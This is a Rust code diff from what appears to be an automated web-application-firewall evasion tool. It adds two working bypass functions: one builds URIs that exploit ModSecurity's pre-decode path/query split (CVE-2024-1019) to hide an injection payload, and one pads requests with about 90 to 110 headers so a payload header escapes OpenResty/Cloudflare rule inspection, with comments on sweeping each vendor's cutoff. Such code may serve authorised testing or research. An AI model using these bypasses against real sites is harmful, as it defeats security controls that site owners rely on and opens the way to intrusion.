@@ -699,6 +699,53 @@ pub fn h2c_post_smuggle(
     })
 }
 
+/// CVE-2024-1019 — ModSecurity v3.0.0–3.0.11 URI pre-decode path/query split.
+///
+/// ModSec URL-decodes the entire URI before splitting on `?`. A `%3F`
+/// (the URL-encoded `?`) embedded in what the backend considers the
+/// PATH becomes a literal `?` to ModSec, so ModSec sees the query
+/// starting earlier than the backend does. The injection lives in
+/// what ModSec calls the query (and inspects loosely) but the backend
+/// calls the path (and routes verbatim, executing the payload).
+///
+/// Constructs a single-line probe path that places `injection_payload`
+/// between an encoded `?` (i.e., backend-path territory) and a real
+/// `?` (backend-query boundary). Fixed in ModSec 3.0.12.
+#[must_use]
+pub fn modsec_uri_pre_decode_split(
+    base_path: &str,
+    injection_payload: &str,
+    benign_query: &str,
+) -> String {
+    // `base_path` + `%3F` + injection lands in backend PATH; ModSec
+    // sees `?injection&benign_query`. nginx / Apache split on the
+    // first LITERAL `?`, which is the trailing real one.
+    format!("{base_path}%3F{injection_payload}?{benign_query}")
+}
+
+/// OpenResty / Cloudflare header-count truncation (Snapsec / HackerOne #3027461).
+///
+/// OpenResty (CF FL) parses max ~94–100 headers (including its own
+/// internal CF-* headers). Headers beyond that threshold are silently
+/// discarded by the rule engine but forwarded to origin. Send N
+/// benign padding headers (`X-Pad-i: v`) plus one payload header
+/// past the truncation cutoff — origin sees the payload, WAF does not.
+///
+/// `padding_count` is parameterised so MCTS can sweep 90..=110 and
+/// find each WAF vendor's exact cutoff.
+#[must_use]
+pub fn header_overflow_smuggle(
+    padding_count: usize,
+    payload_header: &str,
+    payload_value: &str,
+) -> Vec<(String, String)> {
+    let mut headers: Vec<(String, String)> = (0..padding_count)
+        .map(|i| (format!("X-Pad-{i}"), "v".into()))
+        .collect();
+    headers.push((payload_header.into(), payload_value.into()));
+    headers
+}
+
 /// WebSocket smuggling with a random nonce.
 pub fn websocket_smuggle(
     host: &str,
